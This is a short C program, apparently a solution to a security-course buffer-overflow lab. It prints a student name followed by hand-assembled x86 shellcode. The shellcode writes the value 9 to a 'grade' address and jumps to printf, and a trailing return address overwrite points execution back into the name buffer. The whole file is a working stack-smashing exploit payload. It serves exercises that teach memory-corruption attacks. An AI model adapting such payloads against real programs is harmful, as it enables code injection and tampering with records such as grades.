#include <stdio.h>

int main(void){
 int i;
  fputs("Antonia Charal", stdout);
  putchar('\0');
  
  putchar(0xc6);  /* movb */
  putchar(0x05);
  putchar(0xe8);  /* grade */
  putchar(0x46);
  putchar(0x0d);
  putchar(0x08);
  putchar(0x39); /* 9 */
  
  putchar(0xb8);
  putchar(0x6f); /*ekei pou arxizei h printf*/
  putchar(0x8b);
  putchar(0x04);
  putchar(0x08);
  putchar(0xff); /* jmp */
  putchar(0xe0);

  for(i = 0; i < 18; i++) 
    putchar('\0');
    
  /* write i value buf[i++] should be buf[42] */
  putchar(56);   /* overwriten - goto retaddr */
  /* retaddr - inside Name */  
  putchar(0xf0);
  putchar(0x65);
  putchar(0x0d);
  putchar(0x08);
  /* Name */
  putchar(0xe0);
  putchar(0x65);
  putchar(0x0d);
  putchar(0x08);
  
  putchar('\n');
  
  return 0;
}